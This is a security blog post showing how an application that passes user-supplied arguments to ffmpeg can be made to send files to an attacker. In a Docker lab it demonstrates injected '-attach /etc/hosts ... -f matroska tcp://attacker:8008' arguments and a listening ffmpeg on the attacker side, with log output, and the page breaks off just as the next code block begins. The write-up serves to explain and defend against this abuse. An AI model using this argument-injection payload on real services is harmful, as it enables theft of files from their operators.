<!doctype html><html lang=en-gb>
<head>
<meta charset=utf-8>
<meta http-equiv=x-ua-compatible content="IE=edge,chrome=1">
<title>Exfiltration via ffmpeg | Tales about Software Engineering</title>
<meta name=viewport content="width=device-width,minimum-scale=1">
<meta name=generator content="Hugo 0.92.0">
<meta name=ROBOTS content="INDEX, FOLLOW">
<link href=/dist/css/app.4fc0b62e4b82c997bb0041217cd6b979.css rel=stylesheet>
<meta property="og:title" content="Exfiltration via ffmpeg">
<meta property="og:description" content="Here&rsquo;s a fun thought experiment. What if you have an application that allows user-supplied parameters for ffmpeg. Is this a problem? Could this be a security risk?
Let&rsquo;s get one thing out of the way, I&rsquo;m not talking about command injection, where it would be possible to inject shell commands.
Let&rsquo;s assume that the implementation is something like the following:
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  import { spawn } from 'child_process'; const FFMPEG_LOG_LEVEL = 'verbose'; const argsOpt = userSuppliedArgs.">
<meta property="og:type" content="article">
<meta property="og:url" content="https://beny23.github.io/posts/ffmpeg_exfil/"><meta property="article:section" content="posts">
<meta property="article:published_time" content="2025-11-23T00:00:00+00:00">
<meta property="article:modified_time" content="2025-11-23T00:00:00+00:00">
<meta itemprop=name content="Exfiltration via ffmpeg">
<meta itemprop=description content="Here&rsquo;s a fun thought experiment. What if you have an application that allows user-supplied parameters for ffmpeg. Is this a problem? Could this be a security risk?
Let&rsquo;s get one thing out of the way, I&rsquo;m not talking about command injection, where it would be possible to inject shell commands.
Let&rsquo;s assume that the implementation is something like the following:
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  import { spawn } from 'child_process'; const FFMPEG_LOG_LEVEL = 'verbose'; const argsOpt = userSuppliedArgs."><meta itemprop=datePublished content="2025-11-23T00:00:00+00:00">
<meta itemprop=dateModified content="2025-11-23T00:00:00+00:00">
<meta itemprop=wordCount content="1415">
<meta itemprop=keywords content="appsec,security,"><meta name=twitter:card content="summary">
<meta name=twitter:title content="Exfiltration via ffmpeg">
<meta name=twitter:description content="Here&rsquo;s a fun thought experiment. What if you have an application that allows user-supplied parameters for ffmpeg. Is this a problem? Could this be a security risk?
Let&rsquo;s get one thing out of the way, I&rsquo;m not talking about command injection, where it would be possible to inject shell commands.
Let&rsquo;s assume that the implementation is something like the following:
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  import { spawn } from 'child_process'; const FFMPEG_LOG_LEVEL = 'verbose'; const argsOpt = userSuppliedArgs.">
<link rel=me href=https://infosec.exchange/@beny23>
<script data-goatcounter=https://beny23.goatcounter.com/count async src=//gc.zgo.at/count.js></script>
</head>
<body class="ma0 avenir bg-near-white production">
<header class="cover bg-top" style=background-image:url(https://beny23.github.io/images/ffmpeg_exfil_title.jpg)>
<div class="pb3-m pb6-l bg-black-60">
<nav class="pv3 ph3 ph4-ns" role=navigation>
<div class="flex-l justify-between items-center center">
<a href=/ class="f3 fw2 hover-white no-underline white-90 dib">
Tales about Software Engineering
</a>
<div class="flex-l items-center">
<ul class="pl0 mr3">
<li class="list f5 f4-ns fw4 dib pr3">
<a class="hover-white no-underline white-90" href=/about/ title="About page">
About
</a>
</li>
<li class="list f5 f4-ns fw4 dib pr3">
<a class="hover-white no-underline white-90" href=/posts/ title="Blog page">
Blog
</a>
</li>
<li class="list f5 f4-ns fw4 dib pr3">
<a class="hover-white no-underline white-90" href=/talks/ title="Talks page">
Talks
</a>
</li>
<li class="list f5 f4-ns fw4 dib pr3">
<a class="hover-white no-underline white-90" href=/tags/ title="Tags page">
Tags
</a>
</li>
</ul>
<a href=https://stackoverflow.com/users/227140/beny23 target=_blank class="link-transition stackoverflow link dib z-999 pt3 pt0-l mr1" title="Stack Overflow link" rel=noopener aria-label="follow on Stack Overflow——Opens in a new window"><svg height="32" style="enable-background:new 0 0 67 67" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="32"><path d="M12 0C5.373.0.0 5.373.0 12s5.373 12 12 12 12-5.373 12-12S18.627.0 12 0zm.869 5.903 3.114 4.567-.975.665-3.115-4.567.976-.665zm-2.812 2.585 4.84 2.838-.6 1.017-4.842-2.838.602-1.017zm-1.276 2.724 5.413 1.521-.291 1.077-5.428-1.458.306-1.14zm-.588 2.461 5.687.569-.103 1.12-5.691-.513.107-1.176zm-.169 2.16h5.835V17H8.024v-1.167zM16 19H6v-6h1v5h8v-5h1v6zm.195-8.602-.945-5.446 1.162-.202.947 5.446-1.164.202z"/></svg>
<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span></a>
<a href=https://www.linkedin.com/in/gerald-benischke-9811b663 target=_blank class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel=noopener aria-label="follow on LinkedIn——Opens in a new window"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span></a>
<a href=https://github.com/beny23 target=_blank class="link-transition github link dib z-999 pt3 pt0-l mr1" title="Github link" rel=noopener aria-label="follow on Github——Opens in a new window"><svg height="32" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span></a>
<a href=https://infosec.exchange/@beny23 target=_blank class="link-transition mastodon link dib z-999 pt3 pt0-l mr1" title="Mastodon link" rel=noopener aria-label="follow on Mastodon——Opens in a new window"><svg height="32" style="enable-background:new 0 0 230 230" viewBox="0 0 230 230" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M211.80683 139.0875c-3.1825 16.36625-28.4925 34.2775-57.5625 37.74875-15.16 1.80875-30.0825 3.47125-45.99875 2.74125-26.0275-1.1925-46.565-6.2125-46.565-6.2125.0 2.53375.15625 4.94625.46875 7.2025 3.38375 25.68625 25.47 27.225 46.3925 27.9425 21.115.7225 39.91625-5.20625 39.91625-5.20625l.86875 19.09s-14.77 7.93125-41.08125 9.39c-14.50875.7975-32.52375-.365-53.50625-5.91875C9.23183 213.82 1.40558 165.31125.20808 116.09125c-.36375-14.61375-.14-28.39375-.14-39.91875.0-50.33 32.97625-65.0825 32.97625-65.0825C49.67058 3.45375 78.20308.2425 107.86433.0h.72875c29.66125.2425 58.21125 3.45375 74.8375 11.09.0.0 32.97625 14.7525 32.97625 65.0825.0.0.4125 37.13375-4.6 62.915" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/><path d="M65.68743 96.45938c0 9.01375-7.3075 16.32125-16.3225 16.32125-9.01375.0-16.32-7.3075-16.32-16.32125.0-9.01375 7.30625-16.3225 16.32-16.3225 9.015.0 16.3225 7.30875 16.3225 16.3225M124.52893 96.45938c0 9.01375-7.30875 16.32125-16.3225 16.32125s-16.32125-7.3075-16.32125-16.32125c0-9.01375 7.3075-16.3225 16.32125-16.3225 9.01375.0 16.3225 7.30875 16.3225 16.3225M183.36933 96.45938c0 9.01375-7.3075 16.32125-16.32125 16.32125s-16.32125-7.3075-16.32125-16.32125c0-9.01375 7.3075-16.3225 16.32125-16.3225s16.32125 7.30875 16.32125 16.3225" fill="#fff"/></svg>
<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span></a>
</div>
</div>
</nav>
<div class="tc-l pv6 ph3 ph4-ns">
<h1 class="f2 f1-l fw2 white-90 mb0 lh-title">Exfiltration via ffmpeg</h1>
</div>
</div>
</header>
<main class=pb7 role=main>
<article class="flex-l flex-wrap justify-between mw8 center ph3">
<header class="mt4 w-100">
<aside class="instapaper_ignoref b helvetica tracked">
POSTS
</aside>
<div id=sharing class=mt3>
<a href="https://www.facebook.com/sharer.php?u=https://beny23.github.io/posts/ffmpeg_exfil/" class="facebook no-underline" aria-label="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg>
</a>
<a href="https://twitter.com/share?url=https://beny23.github.io/posts/ffmpeg_exfil/&text=Exfiltration%20via%20ffmpeg" class="twitter no-underline" aria-label="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</a>
<a href="https://www.linkedin.com/shareArticle?mini=true&url=https://beny23.github.io/posts/ffmpeg_exfil/&title=Exfiltration%20via%20ffmpeg" class="linkedin no-underline" aria-label="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</a>
</div>
<h1 class="f1 athelas mt3 mb1">Exfiltration via ffmpeg</h1>
<time class="f6 mv4 dib tracked" datetime=2025-11-23T00:00:00Z>November 23, 2025</time>
<span class="f6 mv4 dib tracked"> - 7 minutes read</span>
<span class="f6 mv4 dib tracked"> - 1415 words</span>
</header>
<div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img mid-gray pr4-l w-two-thirds-l"><p>Here&rsquo;s a fun thought experiment. What if you have an application that allows user-supplied parameters
for <a href=https://www.ffmpeg.org>ffmpeg</a>. Is this a problem? Could this be a security risk?</p>
<p>Let&rsquo;s get one thing out of the way, I&rsquo;m not talking about command injection, where it would be
possible to inject shell commands.</p>
<p>Let&rsquo;s assume that the implementation is something like the following:</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-typescript data-lang=typescript><span style=color:#ff79c6>import</span> { spawn } <span style=color:#ff79c6>from</span> <span style=color:#f1fa8c>&#39;child_process&#39;</span>;

<span style=color:#ff79c6>const</span> FFMPEG_LOG_LEVEL <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;verbose&#39;</span>;
<span style=color:#ff79c6>const</span> argsOpt <span style=color:#ff79c6>=</span> userSuppliedArgs.split(<span style=color:#f1fa8c>&#39; &#39;</span>);
<span style=color:#ff79c6>const</span> args <span style=color:#ff79c6>=</span> [
  <span style=color:#f1fa8c>&#39;-f&#39;</span>,
  <span style=color:#f1fa8c>&#39;s16le&#39;</span>,
  <span style=color:#f1fa8c>&#39;-y&#39;</span>,
  <span style=color:#f1fa8c>&#39;-nostdin&#39;</span>,
  <span style=color:#f1fa8c>&#39;-loglevel&#39;</span>,
  FFMPEG_LOG_LEVEL,
  <span style=color:#f1fa8c>&#39;-probesize&#39;</span>,
  <span style=color:#f1fa8c>&#39;32&#39;</span>,
  <span style=color:#f1fa8c>&#39;-i&#39;</span>,
  <span style=color:#f1fa8c>&#39;-&#39;</span>,
  <span style=color:#6272a4>// FFMPEG_COMPRESSOR_ARG is inserted here
</span><span style=color:#6272a4></span>  <span style=color:#f1fa8c>&#39;-f&#39;</span>,
  <span style=color:#f1fa8c>&#39;s16le&#39;</span>,
  <span style=color:#f1fa8c>&#39;-&#39;</span>,
];
<span style=color:#ff79c6>if</span> (argsOpt) args.splice(<span style=color:#bd93f9>10</span>, <span style=color:#bd93f9>0</span>, ...argsOpt);
spawn(<span style=color:#f1fa8c>&#39;ffmpeg&#39;</span>, args, {
  detached: <span style=color:#8be9fd>true</span>,
});
</code></pre></td></tr></table>
</div>
</div><p>Let&rsquo;s say that ffmpeg is called to clean up some audio or do echo calculation as part of a service.</p>
<p>The first thing to say is that calling spawn this way is not vulnerable to command injection. Putting</p>
<pre tabindex=0><code>; touch /tmp/l33t_h4x0rs_were_here
</code></pre><p>Into the user supplied input won&rsquo;t work as it will just be passed as an argument to the ffmpeg call.</p>
<p>One possibility I thought of&mldr; ffmpeg does process URLs. So by specifying a second <code>-i</code> option
it is feasible to get additional video or audio sources ingested:</p>
<pre tabindex=0><code># cat testing.m4a | ffmpeg -f s16le -y -nostdin -loglevel error \ 
     -probesize 32 -i - -report -i https://httpbin.io/dump/request -f s16le - &gt; out
mpp[100]: mpp_soc: open /proc/device-tree/compatible error
mpp[100]: mpp_platform: can not found match soc name: 
mpp[100]: mpp_rt: can NOT found any allocator
[in#1 @ 0xc33bfea38190] Error opening input: Invalid data found when processing input
Error opening input file https://httpbin.io/dump/request.
Error opening input files: Invalid data found when processing input
</code></pre><p>So, by adding <code>-report -i URL</code> I was able to get a network request. Now according to the docs it is also
possible to specify multiple outputs and use network URL to push outputs out, so this could be used to exfiltrate
audio files (assuming we&rsquo;ve not got any egress protection).</p>
<p>But audio files are a bit&mldr; well, not so interesting.</p>
<h1 id=matroska>Matroska</h1>
<p>One thing that did peak my attention was this snippet in the docs:</p>
<blockquote>
<p>-attach filename (output)</p>
<p>Add an attachment to the output file. This is supported by a few formats like Matroska for e.g. fonts
used in rendering subtitles. Attachments are implemented as a specific type of stream, so this option
will add a new stream to the file</p>
</blockquote>
<p>And this turned out to be rather interesting!</p>
<h1 id=demo>Demo</h1>
<p>Let&rsquo;s demonstrate using docker. First I created a docker network:</p>
<pre tabindex=0><code>% docker network create test-network  
66daf2394bd91f863e62e547fdb6371f7d2570f962a9cc2304493491dccc49bd
</code></pre><p>Then I started two docker containers: victim and attacker. Assuming the victim represents the
container that will have ffmpeg parameters injected and the attacker is a computer in the attackers
control.</p>
<h1 id=attacker-setup>Attacker Setup</h1>
<pre tabindex=0><code>% docker run --rm --network test-network --name attacker \
     -it --entrypoint /bin/bash linuxserver/ffmpeg:version-8.0-cli               
root@b8e1b0b0f711:/# ffmpeg -dump_attachment:t &quot;out.txt&quot; -i &quot;tcp://attacker:8008?listen&quot;
</code></pre><p>Here I pull a docker container with the ffmpeg program on it from dockerhub. Though it doesn&rsquo;t
have to be that particular image, any ffmpeg installation should do.</p>
<h1 id=victim-setup>Victim Setup</h1>
<pre tabindex=0><code>% docker run --rm --network test-network --name victim \
     -it --entrypoint /bin/bash linuxserver/ffmpeg:version-8.0-cli 
</code></pre><p>Then when I simulate running the injection, I&rsquo;ll add the following:</p>
<pre tabindex=0><code>-c copy -attach /etc/hosts -metadata:s:t:0 mimetype=text/plain \ 
   -f matroska tcp://attacker:8008
</code></pre><p>This will use the Matroska format and embed an additional stream, package it all up
and send it to the attacker.</p>
<p>The full test command line on the victim machine is:</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash>root@9c0d961d5d15:/# cat testing.m4a| ffmpeg -f s16le -y <span style=color:#f1fa8c>\
</span><span style=color:#f1fa8c></span>  -nostdin -loglevel info -probesize <span style=color:#bd93f9>32</span> -i - -c copy <span style=color:#f1fa8c>\ </span>
  -attach /etc/hosts -metadata:s:t:0 <span style=color:#8be9fd;font-style:italic>mimetype</span><span style=color:#ff79c6>=</span>text/plain <span style=color:#f1fa8c>\
</span><span style=color:#f1fa8c></span>  -f matroska tcp://attacker:8008 -f s16le - &gt; out
<span style=color:#ff79c6>[</span>..<span style=color:#ff79c6>]</span>
Input <span style=color:#6272a4>#0, s16le, from &#39;fd:&#39;:</span>
  Duration: N/A, bitrate: <span style=color:#bd93f9>705</span> kb/s
  Stream <span style=color:#6272a4>#0:0: Audio: pcm_s16le, 44100 Hz, mono, s16, 705 kb/s</span>
Stream mapping:
  Stream <span style=color:#6272a4>#0:0 -&gt; #0:0 (copy)</span>
  File /etc/hosts -&gt; Stream <span style=color:#6272a4>#0:1</span>
  Stream <span style=color:#6272a4>#0:0 -&gt; #1:0 (pcm_s16le (native) -&gt; pcm_s16le (native))</span>
Output <span style=color:#6272a4>#0, matroska, to &#39;tcp://attacker:8008&#39;:</span>
  Metadata:
    encoder         : Lavf62.3.100
  Stream <span style=color:#6272a4>#0:0: Audio: pcm_s16le ([1][0][0][0] / 0x0001), 44100 Hz, mono, s16, 705 kb/s</span>
  Stream <span style=color:#6272a4>#0:1: Attachment: none</span>
    Metadata:
      filename        : hosts
      mimetype        : text/plain
Output <span style=color:#6272a4>#1, s16le, to &#39;pipe:&#39;:</span>
  Metadata:
    encoder         : Lavf62.3.100
  Stream <span style=color:#6272a4>#1:0: Audio: pcm_s16le, 44100 Hz, mono, s16, 705 kb/s</span>
    Metadata:
      encoder         : Lavc62.11.100 pcm_s16le
<span style=color:#ff79c6>[</span>out#0/matroska @ 0xc2ad21eb23e0<span style=color:#ff79c6>]</span> video:0KiB audio:24KiB subtitle:0KiB other streams:0KiB global headers:0KiB muxing overhead: 2.764749%
<span style=color:#ff79c6>[</span>out#1/s16le @ 0xc2ad21eb38d0<span style=color:#ff79c6>]</span> video:0KiB audio:24KiB subtitle:0KiB other streams:0KiB global headers:0KiB muxing overhead: 0.000000%
<span style=color:#8be9fd;font-style:italic>size</span><span style=color:#ff79c6>=</span>      24KiB <span style=color:#8be9fd;font-style:italic>time</span><span style=color:#ff79c6>=</span>00:00:00.27 <span style=color:#8be9fd;font-style:italic>bitrate</span><span style=color:#ff79c6>=</span> 725.1kbits/s <span style=color:#8be9fd;font-style:italic>speed</span><span style=color:#ff79c6>=</span> 157x <span style=color:#8be9fd;font-style:italic>elapsed</span><span style=color:#ff79c6>=</span>0:00:00.00  
</code></pre></td></tr></table>
</div>
</div><p>To reiterate, if that&rsquo;s a service that allows someone to inject arbitrary ffmpeg parameters, this is
quite feasible.</p>
<p>Now, on the attacker machine:</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
